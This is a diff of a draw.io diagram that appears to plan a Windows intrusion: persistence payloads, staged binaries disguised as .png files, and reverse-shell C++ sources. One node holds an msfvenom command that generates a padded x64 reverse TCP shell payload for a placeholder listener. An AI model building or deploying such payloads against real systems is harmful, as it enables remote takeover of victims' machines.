@@ -1,4 +1,4 @@
-<mxfile host="app.diagrams.net" modified="2022-12-23T02:55:54.137Z" agent="5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36" etag="L8zvBeNRz0ELtP-u3CLO" version="20.7.4" type="github" pages="2">
+<mxfile host="app.diagrams.net" modified="2022-12-23T02:56:55.537Z" agent="5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36" etag="0Wks2Dj7juN7lDpDrJG4" version="20.7.4" type="github" pages="2">
   <diagram id="C5RBs43oDa-KdzZeNtuy" name="Overall">
     <mxGraphModel dx="3054" dy="614" grid="1" gridSize="10" guides="1" tooltips="1" connect="1" arrows="1" fold="1" page="1" pageScale="1" pageWidth="827" pageHeight="1169" math="0" shadow="0">
       <root>
@@ -119,7 +119,7 @@
           <mxGeometry x="440" y="40" width="290" height="50" as="geometry" />
         </mxCell>
         <mxCell id="P6aCfQ930mBBJoiv-hOj-24" value="Execute Persistence Payloads" style="swimlane;whiteSpace=wrap;html=1;strokeColor=#000000;fillColor=#00CC00;" vertex="1" parent="WIyWlLk6GJQsqaUBKTNV-1">
-          <mxGeometry x="470" y="618" width="980" height="252" as="geometry" />
+          <mxGeometry x="470" y="618" width="870" height="252" as="geometry" />
         </mxCell>
         <mxCell id="G-sO2mh2Iyi2BEA4O4LV-5" value="Download staged binaries and png&#39;s to Medium IL Tools directory." style="rounded=1;whiteSpace=wrap;html=1;fontSize=12;glass=0;strokeWidth=1;shadow=0;fillColor=#00CC00;" parent="P6aCfQ930mBBJoiv-hOj-24" vertex="1">
           <mxGeometry x="35" y="45" width="120" height="80" as="geometry" />
@@ -187,7 +187,7 @@
         <mxCell id="P6aCfQ930mBBJoiv-hOj-38" value="msfvenom -a x64 --platform Windows -p windows/x64/shell_reverse_tcp -n 1800 --pad-nops LHOST=IP LPORT=Port -f raw EXITFUNC=thread &amp;gt; port#.raw" style="shape=document;whiteSpace=wrap;html=1;boundedLbl=1;fillColor=#FF6666;" vertex="1" parent="P6aCfQ930mBBJoiv-hOj-30">
           <mxGeometry x="710" y="60" width="570" height="50" as="geometry" />
         </mxCell>
-        <mxCell id="P6aCfQ930mBBJoiv-hOj-41" value="Reverse_9001.cpp&#xa;Reverse_9002.cpp" style="swimlane;fontStyle=5;childLayout=stackLayout;horizontal=1;startSize=30;horizontalStack=0;resizeParent=1;resizeParentMax=0;resizeLast=0;collapsible=1;marginBottom=0;fillColor=#FF6666;" vertex="1" parent="P6aCfQ930mBBJoiv-hOj-30">
+        <mxCell id="P6aCfQ930mBBJoiv-hOj-41" value="9001.cpp&#xa;9002.cpp" style="swimlane;fontStyle=5;childLayout=stackLayout;horizontal=1;startSize=30;horizontalStack=0;resizeParent=1;resizeParentMax=0;resizeLast=0;collapsible=1;marginBottom=0;fillColor=#FF6666;" vertex="1" parent="P6aCfQ930mBBJoiv-hOj-30">
           <mxGeometry x="370" y="40" width="150" height="70" as="geometry" />
         </mxCell>
         <mxCell id="P6aCfQ930mBBJoiv-hOj-42" value="Medium IL Tools Directory&#xa;(9101.png)" style="text;strokeColor=none;fillColor=#FF6666;align=left;verticalAlign=middle;spacingLeft=4;spacingRight=4;overflow=hidden;points=[[0,0.5],[1,0.5]];portConstraint=eastwest;rotatable=0;" vertex="1" parent="P6aCfQ930mBBJoiv-hOj-41">
